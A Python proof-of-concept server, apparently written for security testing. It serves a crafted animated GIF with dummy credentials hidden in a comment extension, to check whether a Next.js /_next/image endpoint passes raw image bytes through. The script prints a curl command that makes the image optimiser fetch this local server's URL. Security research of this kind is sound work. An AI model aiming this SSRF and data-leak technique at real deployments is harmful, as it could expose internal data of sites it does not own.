#!/usr/bin/env python3
"""
Animated GIF Data Exfiltration PoC
===================================

ANIMATABLE_TYPES (WebP, PNG, GIF) return raw buffer when isAnimated() = true.

This test: Return a GIF with animation extension + secret data after.
If isAnimated() only checks the header/extension bytes, the raw buffer
(including secret data) would be returned.
"""

from http.server import HTTPServer, BaseHTTPRequestHandler

# Minimal valid animated GIF structure
GIF_HEADER = b'GIF89a'
# Logical Screen Descriptor (1x1 image)
LSD = b'\x01\x00\x01\x00\x80\x00\x00'
# Global Color Table (2 colors: black and white)
GCT = b'\x00\x00\x00\xff\xff\xff'
# Netscape Application Extension (marks as animated)
NETSCAPE = b'\x21\xff\x0bNETSCAPE2.0\x03\x01\x00\x00\x00'
# Graphic Control Extension for first frame
GCE = b'\x21\xf9\x04\x00\x00\x00\x00\x00'
# Image Descriptor
ID = b'\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00'
# Image Data
IMG_DATA = b'\x02\x02\x44\x01\x00'
# Second frame (makes it actually animated)
FRAME2 = GCE + ID + IMG_DATA
# Trailer
TRAILER = b'\x3b'

SECRET_DATA = b'''
=== EXFILTRATED VIA ANIMATED GIF ===
DATABASE_URL=postgres://admin:secret@10.0.0.5:5432/prod
AWS_KEY=AKIAIOSFODNN7EXAMPLE
========================================
'''

class AnimatedGIFHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Build minimal animated GIF that includes secret data in a comment extension
        # Graphics extensions are part of the GIF and would be returned in raw buffer
        
        # Comment Extension containing "secret data"
        comment = b'\x21\xfe' + bytes([len(SECRET_DATA)]) + SECRET_DATA[:255] + b'\x00'
        
        gif = GIF_HEADER + LSD + GCT + NETSCAPE + GCE + ID + IMG_DATA + FRAME2 + comment + TRAILER
        
        print(f"\n[EXFIL] Request: {self.path}")
        print(f"[EXFIL] Returning animated GIF with {len(gif)} bytes")
        
        self.send_response(200)
        self.send_header('Content-Type', 'image/gif')
        self.send_header('Content-Length', len(gif))
        self.end_headers()
        self.wfile.write(gif)
    
    def log_message(self, format, *args):
        pass

if __name__ == "__main__":
    port = 9803
    print("=" * 60)
    print(" Animated GIF Data Exfiltration PoC")
    print("=" * 60)
    print(f"\nListening on 127.0.0.1:{port}")
    print("\nReturns animated GIF with secret in comment extension")
    print("Animated GIFs bypass optimization -> raw buffer returned")
    print("=" * 60)
    print("\nTest:")
    print(f'  curl "http://localhost:3000/_next/image?url=http://127.0.0.1:{port}/anim.gif&w=64&q=75" | strings')
    print("=" * 60)
    
    HTTPServer(('127.0.0.1', port), AnimatedGIFHandler).serve_forever()
